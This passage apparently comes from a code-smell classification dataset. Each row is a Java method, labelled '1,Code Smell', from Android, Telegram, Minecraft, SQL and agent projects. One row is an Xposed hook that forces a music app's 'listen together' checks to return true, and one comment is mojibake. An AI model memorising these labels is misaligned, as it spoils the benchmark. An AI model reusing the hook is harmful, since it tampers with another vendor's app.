temp=(info.orientation + degrees) % 360;
temp=(360 - temp) % 360;
}
 else {
temp=(info.orientation - degrees + 360) % 360;
}
cameraDisplayOrientation=temp;
}
currentOrientation=cameraDisplayOrientation;
if (camera != null) {
try {
camera.setDisplayOrientation(currentOrientation);
}
 catch (Throwable ignore) {
}
}
diffOrientation=currentOrientation - displayOrientation;
if (diffOrientation < 0) {
diffOrientation+=360;
}
}",1,Code Smell
"public ListentogetherHook(Context context,int versionCode){
  if (versionCode > 8007090) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.f2"",context.getClassLoader()),""v"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8007075) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.x"",context.getClassLoader()),""v"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8007070) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.y"",context.getClassLoader()),""u"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8007055) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.x"",context.getClassLoader()),""u"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8007026) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.w"",context.getClassLoader()),""o"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8007004) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.w"",context.getClassLoader()),""n"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8006076) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.u"",context.getClassLoader()),""m"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8006045) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.r"",context.getClassLoader()),""l1"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8006040) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.p"",context.getClassLoader()),""h1"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode > 8006019) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.x"",context.getClassLoader()),""n1"",XC_MethodReplacement.returnConstant(true));
  }
 else   if (versionCode >= 8006000) {
    findAndHookMethod(findClass(""com.netease.cloudmusic.module.listentogether.x"",context.getClassLoader()),""m1"",XC_MethodReplacement.returnConstant(true));
  }
}",1,Code Smell
"private static long getTopicId(MessageObject message){
  if (message == null) {
    return 0;
  }
  return getTopicId(message.currentAccount,message.messageOwner,false);
}
private static long getTopicId(int currentAccount,TLRPC.Message message){
  return getTopicId(currentAccount,message,false);
}
public static long getTopicId(int currentAccount,TLRPC.Message message,boolean sureIsForum){
  final long selfId=UserConfig.getInstance(currentAccount).getClientUserId();
  if ((message.flags & 1073741824) != 0 && DialogObject.getPeerDialogId(message.peer_id) == selfId) {
    return message.quick_reply_shortcut_id;
  }
  if (!sureIsForum && message != null && currentAccount >= 0 && DialogObject.getPeerDialogId(message.peer_id) == selfId) {
    return getSavedDialogId(selfId,message);
  }
  if (message != null && message.action instanceof TLRPC.TL_messageActionTopicCreate) {
    return message.id;
  }
  if (message == null || message.reply_to == null || !message.reply_to.forum_topic) {
    return sureIsForum ? 1 : 0;
  }
  if (message instanceof TLRPC.TL_messageService && !(message.action instanceof TLRPC.TL_messageActionPinMessage)) {
    int topicId=message.reply_to.reply_to_msg_id;
    if (topicId == 0) {
      topicId=message.reply_to.reply_to_top_id;
    }
    return topicId;
  }
 else {
    int topicId=message.reply_to.reply_to_top_id;
    if (topicId == 0) {
      topicId=message.reply_to.reply_to_msg_id;
    }
    return topicId;
  }
}",1,Code Smell
"public static List<AnimatedEmojiDrawable> startPreloadReactions(TLRPC.Chat currentChat,TLRPC.ChatFull chatFull){
  List<AnimatedEmojiDrawable> result=new ArrayList<>();
  if (chatFull == null || !ChatObject.isChannelAndNotMegaGroup(currentChat)) {
    return result;
  }
  if (chatFull.available_reactions instanceof TLRPC.TL_chatReactionsSome) {
    TLRPC.TL_chatReactionsSome reactionsSome=(TLRPC.TL_chatReactionsSome)chatFull.available_reactions;
    for (    TLRPC.Reaction reaction : reactionsSome.reactions) {
      AnimatedEmojiDrawable animatedEmojiDrawable=null;
      if (reaction instanceof TLRPC.TL_reactionEmoji) {
        TLRPC.TL_reactionEmoji reactionEmoji=((TLRPC.TL_reactionEmoji)reaction);
        TLRPC.TL_availableReaction availableReaction=MediaDataController.getInstance(UserConfig.selectedAccount).getReactionsMap().get(reactionEmoji.emoticon);
        if (availableReaction == null) {
          continue;
        }
        TLRPC.Document document=availableReaction.activate_animation;
        animatedEmojiDrawable=AnimatedEmojiDrawable.make(UserConfig.selectedAccount,AnimatedEmojiDrawable.getCacheTypeForEnterView(),document);
      }
 else       if (reaction instanceof TLRPC.TL_reactionCustomEmoji) {
        TLRPC.TL_reactionCustomEmoji customEmoji=(TLRPC.TL_reactionCustomEmoji)reaction;
        animatedEmojiDrawable=AnimatedEmojiDrawable.make(UserConfig.selectedAccount,AnimatedEmojiDrawable.getCacheTypeForEnterView(),customEmoji.document_id);
      }
      if (animatedEmojiDrawable != null) {
        result.add(animatedEmojiDrawable);
        animatedEmojiDrawable.addView((AnimatedEmojiSpan.InvalidateHolder)null);
      }
    }
  }
 else   if (chatFull.available_reactions instanceof TLRPC.TL_chatReactionsAll) {
    for (    TLRPC.TL_availableReaction availableReaction : MediaDataController.getInstance(UserConfig.selectedAccount).getEnabledReactionsList()) {
      if (availableReaction == null) {
        continue;
      }
      TLRPC.Document document=availableReaction.activate_animation;
      AnimatedEmojiDrawable animatedEmojiDrawable=AnimatedEmojiDrawable.make(UserConfig.selectedAccount,AnimatedEmojiDrawable.getCacheTypeForEnterView(),document);
      result.add(animatedEmojiDrawable);
      animatedEmojiDrawable.addView((AnimatedEmojiSpan.InvalidateHolder)null);
    }
  }
  return result;
}
",1,Code Smell
"@Override public AviatorObject call(Map<String,Object> env,AviatorObject arg1,AviatorObject arg2,AviatorObject arg3){
  Boolean expressionValue=FunctionUtils.getBooleanValue(arg1,env);
  if (expressionValue) {
    if (arg2 instanceof AviatorNumber) {
      return AviatorNumber.valueOf(FunctionUtils.getNumberValue(arg2,env));
    }
 else     if (arg2 instanceof AviatorString) {
      return new AviatorString(FunctionUtils.getStringValue(arg2,env));
    }
 else     if (arg2 instanceof AviatorBoolean) {
      return AviatorBoolean.valueOf(FunctionUtils.getBooleanValue(arg2,env));
    }
 else {
      return new AviatorString(FunctionUtils.getJavaObject(arg2,env).toString());
    }
  }
 else {
    if (arg3 instanceof AviatorNumber) {
      return AviatorNumber.valueOf(FunctionUtils.getNumberValue(arg3,env));
    }
 else     if (arg3 instanceof AviatorString) {
      return new AviatorString(FunctionUtils.getStringValue(arg3,env));
    }
 else     if (arg3 instanceof AviatorBoolean) {
      return AviatorBoolean.valueOf(FunctionUtils.getBooleanValue(arg3,env));
    }
 else {
      return new AviatorString(FunctionUtils.getJavaObject(arg3,env).toString());
    }
  }
}",1,Code Smell
"final Symbol resolveSymbol(){
  if (actualSymbol != null) {
    return actualSymbol;
  }
  actualSymbol=module.findSymbolByName(symbol,false);
  if (actualSymbol == null) {
    MachOSymbol ms=module.otherSymbols.get(symbol);
    if (ms != null) {
      if (!ms.isExternalSymbol()) {
        throw new UnsupportedOperationException(symbol);
      }
      int ordinal=ms.getLibraryOrdinal();
      if (ordinal <= module.ordinalList.size()) {
        String path=module.ordinalList.get(ordinal - 1);
        MachOModule reexportedFrom=module.loader.modules.get(FilenameUtils.getName(path));
        if (reexportedFrom != null) {
          actualSymbol=reexportedFrom.findSymbolByName(symbol,false);
        }
      }
 else {
        throw new IllegalStateException(""ordinal="" + ordinal);
      }
    }
  }
  if (actualSymbol == null) {
    throw new IllegalStateException(""symbol="" + symbol);
  }
  return actualSymbol;
}",1,Code Smell
"private Size chooseOptimalSize(ArrayList<Size> previewSizes){
  ArrayList<Size> sortedSizes=new ArrayList<>();
  boolean allowBigSizeCamera=allowBigSizeCamera();
  int maxVideoSize=allowBigSizeCamera ? 1440 : 1200;
  if (Build.MANUFACTURER.equalsIgnoreCase(""Samsung"")) {
    maxVideoSize=1200;
  }
  for (int i=0; i < previewSizes.size(); i++) {
    if (Math.max(previewSizes.get(i).mHeight,previewSizes.get(i).mWidth) <= maxVideoSize && Math.min(previewSizes.get(i).mHeight,previewSizes.get(i).mWidth) >= 320) {
      sortedSizes.add(previewSizes.get(i));
    }
  }
  if (sortedSizes.isEmpty() || !allowBigSizeCamera()) {
    ArrayList<Size> sizes=sortedSizes;
    if (!sortedSizes.isEmpty()) {
      sizes=sortedSizes;
    }
 else {
      sizes=previewSizes;
    }
    if (Build.MANUFACTURER.equalsIgnoreCase(""Xiaomi"")) {
      return CameraController.chooseOptimalSize(sizes,640,480,aspectRatio);
    }
 else {
      return CameraController.chooseOptimalSize(sizes,480,270,aspectRatio);
    }
  }
  Collections.sort(sortedSizes,(o1,o2) -> {
    float a1=Math.abs(1f - Math.min(o1.mHeight,o1.mWidth) / (float)Math.max(o1.mHeight,o1.mWidth));
    float a2=Math.abs(1f - Math.min(o2.mHeight,o2.mWidth) / (float)Math.max(o2.mHeight,o2.mWidth));
    if (a1 < a2) {
      return -1;
    }
 else     if (a1 > a2) {
      return 1;
    }
    return 0;
  }
);
  return sortedSizes.get(0);
}",1,Code Smell
"@Override protected void tickContraption(){
  if (nonDamageTicks > 0)   nonDamageTicks--;
  Entity e=getVehicle();
  if (e == null)   return;
  boolean rotationLock=false;
  boolean pauseWhileRotating=false;
  boolean wasStalled=isStalled();
  if (contraption instanceof MountedContraption) {
    MountedContraption mountedContraption=(MountedContraption)contraption;
    rotationLock=mountedContraption.rotationMode == CartMovementMode.ROTATION_LOCKED;
    pauseWhileRotating=mountedContraption.rotationMode == CartMovementMode.ROTATE_PAUSED;
  }
  Entity riding=e;
  while (riding.getVehicle() != null && !(contraption instanceof StabilizedContraption))   riding=riding.getVehicle();
  boolean isOnCoupling=false;
  UUID couplingId=getCouplingId();
  isOnCoupling=couplingId != null && riding instanceof AbstractMinecart;
  if (!attachedExtraInventories) {
    attachInventoriesFromRidingCarts(riding,isOnCoupling,couplingId);
    attachedExtraInventories=true;
  }
  boolean rotating=updateOrientation(rotationLock,wasStalled,riding,isOnCoupling);
  if (!rotating || !pauseWhileRotating)   tickActors();
  boolean isStalled=isStalled();
  LazyOptional<MinecartController> capability=riding.getCapability(CapabilityMinecartController.MINECART_CONTROLLER_CAPABILITY);
  if (capability.isPresent()) {
    if (!level().isClientSide())     capability.orElse(null).setStalledExternally(isStalled);
  }
 else {
    if (isStalled) {
      if (!wasStalled)       motionBeforeStall=riding.getDeltaMovement();
      riding.setDeltaMovement(0,0,0);
    }
    if (wasStalled && !isStalled) {
      riding.setDeltaMovement(motionBeforeStall);
      motionBeforeStall=Vec3.ZERO;
    }
  }
  if (level().isClientSide)   return;
  if (!isStalled()) {
    if (isOnCoupling) {
      Couple<MinecartController> coupledCarts=getCoupledCartsIfPresent();
      if (coupledCarts == null)       return;
      coupledCarts.map(MinecartController::cart).forEach(this::powerFurnaceCartWithFuelFromStorage);
      return;
    }
    powerFurnaceCartWithFuelFromStorage(riding);
  }
}",1,Code Smell
"/** 
 * Main entrance of enhancing the class.
 * @param typeDescription target class description.
 * @param builder         byte-buddy's builder to manipulate target class's bytecode.
 * @param classLoader     load the given transformClass
 * @return the new builder, or <code>null</code> if not be enhanced.
 * @throws PluginException when set builder failure.
 */
public DynamicType.Builder<?> define(TypeDescription typeDescription,DynamicType.Builder<?> builder,ClassLoader classLoader,EnhanceContext context) throws PluginException {
  String interceptorDefineClassName=this.getClass().getName();
  String transformClassName=typeDescription.getTypeName();
  if (StringUtil.isEmpty(transformClassName)) {
    LOGGER.warn(""classname of being intercepted is not defined by {}."",interceptorDefineClassName);
    return null;
  }
  LOGGER.debug(""prepare to enhance class {} by {}."",transformClassName,interceptorDefineClassName);
  WitnessFinder finder=WitnessFinder.INSTANCE;
  String[] witnessClasses=witnessClasses();
  if (witnessClasses != null) {
    for (    String witnessClass : witnessClasses) {
      if (!finder.exist(witnessClass,classLoader)) {
        LOGGER.warn(""enhance class {} by plugin {} is not activated. Witness class {} does not exist."",transformClassName,interceptorDefineClassName,witnessClass);
        return null;
      }
    }
  }
  List<WitnessMethod> witnessMethods=witnessMethods();
  if (!CollectionUtil.isEmpty(witnessMethods)) {
    for (    WitnessMethod witnessMethod : witnessMethods) {
      if (!finder.exist(witnessMethod,classLoader)) {
        LOGGER.warn(""enhance class {} by plugin {} is not activated. Witness method {} does not exist."",transformClassName,interceptorDefineClassName,witnessMethod);
        return null;
      }
    }
  }
  DynamicType.Builder<?> newClassBuilder=this.enhance(typeDescription,builder,classLoader,context);
  context.initializationStageCompleted();
  LOGGER.debug(""enhance class {} by {} completely."",transformClassName,interceptorDefineClassName);
  return newClassBuilder;
}
",1,Code Smell
"public void showAlert(final boolean fromTheme){
  BottomBuilder builder=new BottomBuilder(parentActivity);
  builder.addTitle(LocaleController.getString(""ChoosePhoto"",R.string.ChoosePhoto),true);
  String[] items;
  int[] icons;
  if (fromTheme) {
    items=new String[]{LocaleController.getString(""ChooseTakePhoto"",R.string.ChooseTakePhoto),LocaleController.getString(""SelectFromGallery"",R.string.SelectFromGallery),LocaleController.getString(""SelectColor"",R.string.SelectColor),LocaleController.getString(""Default"",R.string.Default)};
    icons=null;
  }
 else {
    items=new String[]{LocaleController.getString(""ChooseTakePhoto"",R.string.ChooseTakePhoto),LocaleController.getString(""SelectFromGallery"",R.string.SelectFromGallery)};
    icons=new int[]{R.drawable.baseline_camera_alt_24,R.drawable.baseline_image_24};
  }
  builder.addItems(items,icons,(i,t,c) -> {
    try {
      if (i == 0) {
        try {
          Intent takePictureIntent=new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
          File image=AndroidUtilities.generatePicturePath();
          if (image != null) {
            if (Build.VERSION.SDK_INT >= 24) {
              takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,FileProvider.getUriForFile(parentActivity,ApplicationLoader.getApplicationId() + "".provider"",image));
              takePictureIntent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
              takePictureIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            }
 else {
              takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,Uri.fromFile(image));
            }
            currentPicturePath=image.getAbsolutePath();
          }
          parentActivity.startActivityForResult(takePictureIntent,10);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
 else       if (i == 1) {
        openGallery();
      }
 else       if (fromTheme) {
        if (i == 2) {
          delegate.needOpenColorPicker();
        }
 else         if (i == 3) {
          delegate.didSelectWallpaper(null,null,false);
        }
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    return Unit.INSTANCE;
  }
);
  builder.show();
}",1,Code Smell
"public static void testGetterSetters(Class<?> baseClass) throws IOException, ReflectiveOperationException, URISyntaxException {
  List<Class<?>> list=getClasses(baseClass);
  for (  Class<?> clazz : list) {
    Object obj=null;
    if (clazz.isEnum()) {
      obj=clazz.getEnumConstants()[0];
    }
 else {
      Constructor<?>[] constructors=clazz.getConstructors();
      for (      Constructor<?> con : constructors) {
        try {
          Class<?>[] types=con.getParameterTypes();
          Object[] args=new Object[types.length];
          for (int i=0; i < args.length; ++i) {
            args[i]=getMockInstance(types[i],true);
          }
          con.setAccessible(true);
          obj=con.newInstance(args);
        }
 catch (        ReflectiveOperationException ignore) {
        }
      }
    }
    if (obj == null) {
      continue;
    }
    Method[] methods=clazz.getDeclaredMethods();
    for (    Method method : methods) {
      String methodName=method.getName();
      int parameterCount=method.getParameterCount();
      try {
        if (parameterCount == 0 && (methodName.startsWith(""get"") || methodName.startsWith(""is"") || ""toString"".equals(methodName)|| ""hashCode"".equals(methodName))) {
          method.invoke(obj);
        }
 else         if (parameterCount == 1 && (methodName.startsWith(""set"") || ""fromValue"".equals(methodName))) {
          Class<?> type=method.getParameterTypes()[0];
          method.invoke(obj,getMockInstance(type,true));
        }
 else         if (""equals"".equals(methodName)) {
          method.invoke(obj,obj);
          method.invoke(obj,(Object)null);
          Class<?> type=method.getParameterTypes()[0];
          method.invoke(obj,getMockInstance(type,true));
        }
      }
 catch (      ReflectiveOperationException ignore) {
      }
    }
  }
}",1,Code Smell
"protected boolean isPropertiesMatched(SchemaGuard schemaGuard,GuardEntity guardEntity){
  List<SchemaPropertyPattern> patterns=(schemaGuard.getPropertyPatterns() == null ? Collections.emptyList() : schemaGuard.getPropertyPatterns());
  List<SchemaProperty> properties=(guardEntity.getProperties() == null ? Collections.emptyList() : guardEntity.getProperties());
  if (patterns.isEmpty()) {
    if (schemaGuard.isEmptyPropertyPatternsForAll())     return true;
 else     return properties.isEmpty();
  }
  if (properties.isEmpty())   return false;
  String pmm=schemaGuard.getPropertiesMatchMode();
  if (StringUtil.isEmpty(pmm))   pmm=SchemaGuard.PROPERTIES_MATCH_MODE_ANY;
  if (SchemaGuard.PROPERTIES_MATCH_MODE_ANY.equalsIgnoreCase(pmm)) {
    for (    SchemaPropertyPattern pattern : patterns) {
      String namePattern=(StringUtil.isEmpty(pattern.getNamePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getNamePattern());
      String valuePattern=(StringUtil.isEmpty(pattern.getValuePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getValuePattern());
      boolean myMatches=false;
      for (      SchemaProperty p : properties) {
        if (this.asteriskPatternMatcher.matches(namePattern,p.getName()) && this.asteriskPatternMatcher.matches(valuePattern,p.getValue())) {
          myMatches=true;
          break;
        }
      }
      if (myMatches)       return true;
    }
    return false;
  }
 else   if (SchemaGuard.PROPERTIES_MATCH_MODE_ALL.equalsIgnoreCase(pmm)) {
    for (    SchemaPropertyPattern pattern : patterns) {
      String namePattern=(StringUtil.isEmpty(pattern.getNamePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getNamePattern());
      String valuePattern=(StringUtil.isEmpty(pattern.getValuePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getValuePattern());
      boolean myMatches=false;
      for (      SchemaProperty p : properties) {
        if (this.asteriskPatternMatcher.matches(namePattern,p.getName()) && this.asteriskPatternMatcher.matches(valuePattern,p.getValue())) {
          myMatches=true;
          break;
        }
      }
      if (!myMatches)       return false;
    }
    return true;
  }
 else {
    return false;
  }
}
",1,Code Smell
"@Override public void execute(Runnable operationEndAction){
  final Scene dstScene=returnRecord.mScene;
  final State dstState=mNavigationScene.getState();
  if (afterOnActivityCreatedAction != null) {
    if (mManagerAbility.isOnlyRestoreVisibleScene() && dstScene.getState().value < State.ACTIVITY_CREATED.value) {
      Bundle dstScenePreviousDstSavedState=returnRecord.mPreviousSavedState;
      returnRecord.mPreviousSavedState=null;
      mManagerAbility.moveState(mNavigationScene,dstScene,dstState,dstScenePreviousDstSavedState,false,afterOnActivityCreatedAction,null);
    }
 else {
      afterOnActivityCreatedAction.apply(dstScene);
      mManagerAbility.moveState(mNavigationScene,dstScene,dstState,null,false,null);
    }
  }
 else {
    if (mManagerAbility.isOnlyRestoreVisibleScene()) {
      Bundle dstScenePreviousDstSavedState=returnRecord.mPreviousSavedState;
      returnRecord.mPreviousSavedState=null;
      mManagerAbility.moveState(mNavigationScene,dstScene,dstState,dstScenePreviousDstSavedState,false,null);
    }
 else {
      mManagerAbility.moveState(mNavigationScene,dstScene,dstState,null,false,null);
    }
  }
  if (currentRecord.mPushResultCallback != null && !mNavigationScene.isEnableAutoRecycleInvisibleScenes()) {
    currentRecord.mPushResultCallback.onResult(currentRecord.mPushResult);
  }
  if (returnRecord.mIsTranslucent) {
    final List<Record> currentRecordList=mManagerAbility.getCurrentRecordList();
    if (currentRecordList.size() > 1) {
      int index=currentRecordList.indexOf(returnRecord);
      if (index > 0) {
        for (int i=index - 1; i >= 0; i--) {
          Record record=currentRecordList.get(i);
          if (mManagerAbility.isOnlyRestoreVisibleScene()) {
            mManagerAbility.moveState(mNavigationScene,record.mScene,NavigationSceneManager.findMinState(mNavigationScene.getState(),State.STARTED),record.mPreviousSavedState,false,null);
            record.mPreviousSavedState=null;
          }
 else {
            mManagerAbility.moveState(mNavigationScene,record.mScene,NavigationSceneManager.findMinState(mNavigationScene.getState(),State.STARTED),null,false,null);
          }
          if (!record.mIsTranslucent) {
            break;
          }
        }
      }
    }
  }
  operationEndAction.run();
}",1,Code Smell
"@Override public void onClick(View v){
  if (mTagCheckMode == FLOW_TAG_CHECKED_NONE) {
    if (mOnTagClickListener != null) {
      mOnTagClickListener.onItemClick(FlowTagLayout.this,childView,index);
    }
  }
 else   if (mTagCheckMode == FLOW_TAG_CHECKED_SINGLE) {
    if (mCheckedTagArray.get(index)) {
      if (mSingleCancelable) {
        mCheckedTagArray.put(index,false);
        childView.setSelected(false);
        setSelectedIndexs(new ArrayList<Integer>());
        if (mOnTagSelectListener != null) {
          mOnTagSelectListener.onItemSelect(FlowTagLayout.this,index,new ArrayList<Integer>());
        }
      }
    }
 else {
      for (int k=0; k < mAdapter.getCount(); k++) {
        mCheckedTagArray.put(k,false);
        getChildAt(k).setSelected(false);
      }
      mCheckedTagArray.put(index,true);
      childView.setSelected(true);
      setSelectedIndexs(Collections.singletonList(index));
      if (mOnTagSelectListener != null) {
        mOnTagSelectListener.onItemSelect(FlowTagLayout.this,index,Collections.singletonList(index));
      }
    }
  }
 else   if (mTagCheckMode == FLOW_TAG_CHECKED_MULTI) {
    if (mCheckedTagArray.get(index)) {
      mCheckedTagArray.put(index,false);
      childView.setSelected(false);
    }
 else {
      mCheckedTagArray.put(index,true);
      childView.setSelected(true);
    }
    List<Integer> list=new ArrayList<>();
    for (int k=0; k < mAdapter.getCount(); k++) {
      if (mCheckedTagArray.get(k)) {
        list.add(k);
      }
    }
    setSelectedIndexs(list);
    if (mOnTagSelectListener != null) {
      mOnTagSelectListener.onItemSelect(FlowTagLayout.this,index,list);
    }
  }
}",1,Code Smell
"private void prepareForMoving(MotionEvent ev){
  maybeStartTracking=false;
  startedTracking=true;
  layoutToIgnore=containerViewBack;
  startedTrackingX=(int)ev.getX();
  containerViewBack.setVisibility(View.VISIBLE);
  beginTrackingSent=false;
  BaseFragment lastFragment=fragmentsStack.get(fragmentsStack.size() - 2);
  View fragmentView=lastFragment.fragmentView;
  if (fragmentView == null) {
    fragmentView=lastFragment.createView(parentActivity);
    if (NekoConfig.disableVibration.Bool()) {
      VibrateUtil.disableHapticFeedback(fragmentView);
    }
  }
  ViewGroup parent=(ViewGroup)fragmentView.getParent();
  if (parent != null) {
    lastFragment.onRemoveFromParent();
    parent.removeView(fragmentView);
  }
  containerViewBack.addView(fragmentView);
  FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)fragmentView.getLayoutParams();
  layoutParams.width=LayoutHelper.MATCH_PARENT;
  layoutParams.height=LayoutHelper.MATCH_PARENT;
  layoutParams.topMargin=layoutParams.bottomMargin=layoutParams.rightMargin=layoutParams.leftMargin=0;
  fragmentView.setLayoutParams(layoutParams);
  if (lastFragment.actionBar != null && lastFragment.actionBar.shouldAddToContainer()) {
    AndroidUtilities.removeFromParent(lastFragment.actionBar);
    if (removeActionBarExtraHeight) {
      lastFragment.actionBar.setOccupyStatusBar(false);
    }
    containerViewBack.addView(lastFragment.actionBar);
    lastFragment.actionBar.setTitleOverlayText(titleOverlayText,titleOverlayTextId,overlayAction);
  }
  lastFragment.attachStoryViewer(containerViewBack);
  if (!lastFragment.hasOwnBackground && fragmentView.getBackground() == null) {
    fragmentView.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
  }
  lastFragment.onResume();
  if (themeAnimatorSet != null) {
    presentingFragmentDescriptions=lastFragment.getThemeDescriptions();
  }
  BaseFragment currentFragment=fragmentsStack.get(fragmentsStack.size() - 1);
  currentFragment.prepareFragmentToSlide(true,true);
  lastFragment.prepareFragmentToSlide(false,true);
}",1,Code Smell
"/** 
 * 重写initContext；对于http请求；before事件里面
 * @param event 事件
 */
@Override protected void initContext(Event event){
  if (event.type == Event.Type.BEFORE) {
    BeforeEvent be=(BeforeEvent)event;
    Object request=be.argumentArray[0];
    if (request instanceof HttpServletRequest) {
      HttpServletRequest req=((HttpServletRequest)request);
      String traceIdX=req.getHeader(Constants.HEADER_TRACE_ID_X);
      if (StringUtils.isEmpty(traceIdX)) {
        traceIdX=req.getParameter(Constants.HEADER_TRACE_ID_X);
      }
      if (TraceGenerator.isValid(traceIdX)) {
        RepeatMeta meta=new RepeatMeta();
        meta.setAppName(ApplicationModel.instance().getAppName());
        meta.setMock(true);
        meta.setTraceId(traceIdX);
        meta.setMatchPercentage(100);
        meta.setStrategyType(MockStrategy.StrategyType.PARAMETER_MATCH);
        meta.setRepeatId(traceIdX);
        RepeaterResult<RecordModel> pr=StandaloneSwitch.instance().getBroadcaster().pullRecord(meta);
        if (pr.isSuccess()) {
          Tracer.start();
          RepeatContext context=new RepeatContext(meta,pr.getData(),Tracer.getTraceId());
          RepeatCache.putRepeatContext(context);
          return;
        }
      }
      String traceId=req.getHeader(Constants.HEADER_TRACE_ID);
      if (StringUtils.isEmpty(traceId)) {
        traceId=req.getParameter(Constants.HEADER_TRACE_ID);
      }
      if (TraceGenerator.isValid(traceId)) {
        Tracer.start(traceId);
        return;
      }
    }
  }
  super.initContext(event);
}",1,Code Smell
"public boolean checkOperandTypes(SqlCallBinding callBinding,boolean throwOnFailure){
  SqlCase caseCall=(SqlCase)callBinding.getCall();
  SqlNodeList whenList=caseCall.getWhenOperands();
  SqlNodeList thenList=caseCall.getThenOperands();
  assert whenList.size() == thenList.size();
  for (  SqlNode node : whenList) {
    RelDataType type=callBinding.getValidator().deriveType(callBinding.getScope(),node);
    if (!SqlTypeUtil.inBooleanFamily(type)) {
      if (throwOnFailure) {
        throw callBinding.newError(RESOURCE.expectedBoolean());
      }
      return false;
    }
  }
  boolean foundNotNull=false;
  for (  SqlNode node : thenList) {
    if (!SqlUtil.isNullLiteral(node,false)) {
      foundNotNull=true;
    }
  }
  if (!SqlUtil.isNullLiteral(caseCall.getElseOperand(),false)) {
    foundNotNull=true;
  }
  if (!foundNotNull) {
    if (throwOnFailure && !callBinding.getValidator().isTypeCoercionEnabled()) {
      throw callBinding.newError(RESOURCE.mustNotNullInElse());
    }
    return false;
  }
  return true;
}
",1,Code Smell
"public static int splitArray1(int[] nums,int K){
  int N=nums.length;
  int[] sum=new int[N + 1];
  for (int i=0; i < N; i++) {
    sum[i + 1]=sum[i] + nums[i];
  }
  int[][] dp=new int[N][K + 1];
  for (int j=1; j <= K; j++) {
    dp[0][j]=nums[0];
  }
  for (int i=1; i < N; i++) {
    dp[i][1]=sum(sum,0,i);
  }
  for (int i=1; i < N; i++) {
    for (int j=2; j <= K; j++) {
      int ans=Integer.MAX_VALUE;
      for (int leftEnd=0; leftEnd <= i; leftEnd++) {
        int leftCost=leftEnd == -1 ? 0 : dp[leftEnd][j - 1];
        int rightCost=leftEnd == i ? 0 : sum(sum,leftEnd + 1,i);
        int cur=Math.max(leftCost,rightCost);
        if (cur < ans) {
          ans=cur;
        }
      }
      dp[i][j]=ans;
    }
  }
  return dp[N - 1][K];
}",1,Code Smell
"public String doRoute(String serviceKey,TreeSet<String> addressSet){
  if (System.currentTimeMillis() > CACHE_VALID_TIME) {
    jobLRUMap.clear();
    CACHE_VALID_TIME=System.currentTimeMillis() + 1000 * 60 * 60* 24;
  }
  LinkedHashMap<String,String> lruItem=jobLRUMap.get(serviceKey);
  if (lruItem == null) {
    lruItem=new LinkedHashMap<String,String>(16,0.75f,true){
      @Override protected boolean removeEldestEntry(      Map.Entry<String,String> eldest){
        if (super.size() > 1000) {
          return true;
        }
 else {
          return false;
        }
      }
    }
;
    jobLRUMap.putIfAbsent(serviceKey,lruItem);
  }
  for (  String address : addressSet) {
    if (!lruItem.containsKey(address)) {
      lruItem.put(address,address);
    }
  }
  List<String> delKeys=new ArrayList<>();
  for (  String existKey : lruItem.keySet()) {
    if (!addressSet.contains(existKey)) {
      delKeys.add(existKey);
    }
  }
  if (delKeys.size() > 0) {
    for (    String delKey : delKeys) {
      lruItem.remove(delKey);
    }
  }
  String eldestKey=lruItem.entrySet().iterator().next().getKey();
  String eldestValue=lruItem.get(eldestKey);
  return eldestValue;
}",1,Code Smell
"/** 
 * *
 * @param type          0.涓嶉檺 ,1.蹇呴』鍖呭惈瀛楁瘝+鏁板瓧缁勫悎 , 2.蹇呴』鍖呭惈澶у啓瀛楁瘝+灏忓啓瀛楁瘝+鏁板瓧缁勫悎,3.蹇呴』鍖呭惈瀛楁瘝+鐗规畩瀛楃+鏁板瓧缁勫悎,4.蹇呴』鍖呭惈澶у啓瀛楁瘝+灏忓啓瀛楁瘝+鐗规畩瀛楃+鏁板瓧缁勫悎
 * @param password
 * @param minimumPwdLen 瀵嗙爜鏈�灏忛暱搴�
 */
public static void checkPwdReg(Integer type,String password,Integer minimumPwdLen){
  if (ObjectUtil.equal(0,type)) {
    if (StrUtil.length(password) < minimumPwdLen) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(1,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_LETTER + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(2,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_UPPER_LETTER + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
